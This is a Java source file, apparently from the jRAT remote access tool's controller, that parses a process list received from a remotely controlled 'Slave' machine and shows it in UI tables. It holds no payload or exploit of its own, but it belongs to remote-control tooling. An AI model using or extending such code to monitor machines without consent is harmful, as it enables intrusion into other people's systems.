package se.jrat.client.packets.incoming;

import java.io.DataInputStream;

import se.jrat.client.Slave;
import se.jrat.client.ui.frames.FrameControlPanel;
import se.jrat.client.ui.frames.FrameRemoteProcess;
import se.jrat.client.ui.panels.PanelControlRemoteProcess;

import com.redpois0n.oslib.OperatingSystem;


public class Packet25Process extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		try {
			FrameRemoteProcess frame = FrameRemoteProcess.instances.get(slave);
			FrameControlPanel framec = FrameControlPanel.instances.get(slave);
			String line = slave.readLine();
			String[] displayData = new String[4];
			
			if (slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				line = line.replace("\"", "").replace("ÿ", "");
				String[] args = line.split(",");

				displayData[0] = args[0]; // name
				displayData[1] = args[1]; // pid
				displayData[2] = args[2]; // type / user
				displayData[3] = args[4]; // memory usage
			} else {
				line = line.trim().replaceAll("( )+", " ");
				String[] args = line.split(" ");

				displayData[0] = args[10];
				displayData[1] = args[2];
				displayData[2] = args[0];
				displayData[3] = args[3];
			}

			for (int i = 0; i < displayData.length; i++) {
				if (displayData[i] == null) {
					displayData[i] = "";
				}
			}
			if (frame != null) {
				frame.model.addRow(new Object[] { displayData[0], displayData[1], displayData[2], displayData[3] });
			}
			if (framec != null) {
				PanelControlRemoteProcess panel = (PanelControlRemoteProcess) framec.panels.get("remote process");
				panel.getModel().addRow(new Object[] { displayData[0], displayData[1], displayData[2], displayData[3] });
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

}
